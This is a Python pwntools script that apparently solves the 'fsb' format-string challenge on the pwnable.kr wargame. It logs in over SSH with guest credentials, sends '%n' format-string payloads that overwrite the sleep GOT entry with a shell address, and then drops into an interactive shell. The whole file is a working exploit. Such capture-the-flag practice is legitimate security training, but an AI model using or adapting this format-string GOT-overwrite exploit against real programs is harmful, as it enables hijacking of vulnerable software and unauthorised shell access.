from pwn import *
import time

context.log_level = 'debug'

con = ssh(host='pwnable.kr', port = 2222, user='fsb', password='guest')

p = con.process("/home/fsb/fsb")
print p.recv()
time.sleep(1)
# %19$x

payload = "%14$x"
shell_addr = 0x80486ab
GOT_sleep = 0x804a008

payload = "%{}c%15$n".format(GOT_sleep)
p.sendline(payload)
for i in range(32842):
    print i
    p.recv()
print p.recv()

payload2 = "%{}c%21$n".format(shell_addr)
p.sendline(payload2)
for i in range(32840):
    print i
    p.recv()
print p.recv()

time.sleep(3)
p.sendline("a" * 40)
print p.recv()
p.sendline("a" * 40)
print p.recv()

p.interactive()
